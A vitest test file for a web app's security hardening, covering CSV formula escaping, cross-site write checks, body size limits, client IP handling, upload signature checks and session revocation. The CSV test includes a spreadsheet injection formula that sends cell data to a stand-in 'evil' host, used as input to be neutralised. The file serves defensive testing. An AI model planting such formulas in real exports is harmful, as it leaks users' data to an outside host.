import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { afterEach, describe, expect, it, vi } from "vitest";

// A throwaway database for this file; set before anything opens one.
const dir = fs.mkdtempSync(path.join(os.tmpdir(), "hoax-hardening-"));
process.env.DATABASE_PATH = path.join(dir, "test.db");

const { csvCell } = await import("@/lib/csv");
const { isCrossSiteWrite } = await import("@/lib/request-origin");
const { BodyTooLarge, readJsonObject, readLimited } = await import("@/lib/body-limit");
const { clientIp, limitKey } = await import("@/lib/rate-limit");
const { hasImageSignature } = await import("@/lib/uploads");
const { createSession, verifySession } = await import("@/lib/auth");
const cutoff = await import("@/lib/session-cutoff");
const { normalizeDomain } = await import("@/lib/settings");

afterEach(() => vi.unstubAllEnvs());

describe("CSV cells", () => {
  it("neutralises formulas typed by visitors", () => {
    expect(csvCell('=HYPERLINK("https://evil/?"&A2,"x")')).toBe(`"'=HYPERLINK(""https://evil/?""&A2,""x"")"`);
    for (const s of ["+1", "-1+2", "@SUM(A1)", "\tx"]) expect(csvCell(s).replace(/^"/, "")[0]).toBe("'");
    expect(csvCell("plain, text")).toBe('"plain, text"');
    // Numbers stay numbers.
    expect(csvCell(-0.5)).toBe("-0.5");
  });
});

describe("cross-site writes", () => {
  const req = (method: string, headers: Record<string, string>) => ({ method, headers: new Headers({ host: "syyhoaxanalyzer.com", ...headers }) });
  it("refuses other sites and sibling subdomains, allows this site and scripts", () => {
    expect(isCrossSiteWrite(req("POST", { "sec-fetch-site": "cross-site" }))).toBe(true);
    expect(isCrossSiteWrite(req("POST", { "sec-fetch-site": "same-site" }))).toBe(true);
    expect(isCrossSiteWrite(req("POST", { "sec-fetch-site": "same-origin" }))).toBe(false);
    expect(isCrossSiteWrite(req("POST", { origin: "https://evil.example" }))).toBe(true);
    expect(isCrossSiteWrite(req("POST", { origin: "https://syyhoaxanalyzer.com" }))).toBe(false);
    expect(isCrossSiteWrite(req("POST", {}))).toBe(false);
    expect(isCrossSiteWrite(req("GET", { "sec-fetch-site": "cross-site" }))).toBe(false);
  });
});

describe("request bodies", () => {
  const body = (text: string, headers: Record<string, string> = {}) => new Request("http://x/", { method: "POST", body: text, headers });
  it("stops reading past the cap, even without a Content-Length", async () => {
    const stream = new ReadableStream({
      pull(c) {
        c.enqueue(new Uint8Array(64 * 1024));
      },
    });
    const req = new Request("http://x/", { method: "POST", body: stream, duplex: "half" } as RequestInit);
    await expect(readLimited(req, 256 * 1024)).rejects.toBeInstanceOf(BodyTooLarge);
  });
  it("turns null, arrays and scalars into an empty object", async () => {
    expect(await readJsonObject(body("null"), 1024)).toEqual({});
    expect(await readJsonObject(body("[1]"), 1024)).toEqual({});
    expect(await readJsonObject(body('{"text":"x"}'), 1024)).toEqual({ text: "x" });
  });
});

describe("visitor address", () => {
  const req = (headers: Record<string, string>) => new Request("http://x/", { headers });
  it("reads only the configured header", () => {
    expect(clientIp(req({ "cf-connecting-ip": "36.68.1.1", "x-real-ip": "1.2.3.4", "x-forwarded-for": "5.6.7.8" }))).toBe("36.68.1.1");
    // Behind Caddy a visitor's own CF-Connecting-IP must not count.
    vi.stubEnv("TRUSTED_IP_HEADER", "x-forwarded-for");
    expect(clientIp(req({ "cf-connecting-ip": "9.9.9.9", "x-forwarded-for": "6.6.6.6, 36.68.1.1" }))).toBe("36.68.1.1");
  });
  it("groups an IPv6 /64 into one rate-limit key", () => {
    expect(limitKey(req({ "cf-connecting-ip": "2001:db8:1:2:3:4:5:6" }))).toBe("2001:db8:1:2::/64");
    expect(limitKey(req({ "cf-connecting-ip": "2001:db8:1:2::9" }))).toBe("2001:db8:1:2::/64");
    expect(limitKey(req({ "cf-connecting-ip": "2001:db8::1" }))).toBe("2001:db8:0:0::/64");
    expect(limitKey(req({ "cf-connecting-ip": "36.68.1.1" }))).toBe("36.68.1.1");
  });
});

describe("uploads", () => {
  it("accepts only real PNG, JPEG, GIF and WebP signatures", () => {
    expect(hasImageSignature(Buffer.from("\x89PNG\r\n\x1a\n0000", "latin1"))).toBe(true);
    expect(hasImageSignature(Buffer.from([0xff, 0xd8, 0xff, 0xe0, 0, 0, 0, 0, 0, 0, 0, 0]))).toBe(true);
    expect(hasImageSignature(Buffer.from("GIF89a000000", "latin1"))).toBe(true);
    expect(hasImageSignature(Buffer.from("RIFF0000WEBPVP8 ", "latin1"))).toBe(true);
    expect(hasImageSignature(Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"></svg>'))).toBe(false);
    expect(hasImageSignature(Buffer.from("II*\0" + "0".repeat(10), "latin1"))).toBe(false);
  });
});

describe("sessions", () => {
  it("are refused after 'sign out everywhere'", async () => {
    const token = createSession();
    expect(verifySession(token)).toBe(true);
    expect(cutoff.isAdminToken(token)).toBe(true);
    await new Promise((r) => setTimeout(r, 5));
    cutoff.revokeAllSessions();
    expect(cutoff.isAdminToken(token)).toBe(false);
    await new Promise((r) => setTimeout(r, 5));
    expect(cutoff.isAdminToken(createSession())).toBe(true);
  });
  it("from before issue times were recorded are refused once a cutoff exists", () => {
    const legacy = Buffer.from(JSON.stringify({ exp: Date.now() + 60_000 })).toString("base64url");
    expect(verifySession(`${legacy}.x`, 1)).toBe(false);
  });
});

describe("skip list", () => {
  it("treats a trailing dot as the same host", () => {
    expect(normalizeDomain("facebook.com.")).toBe("facebook.com");
    expect(normalizeDomain("https://www.Facebook.com./x")).toBe("facebook.com");
  });
});
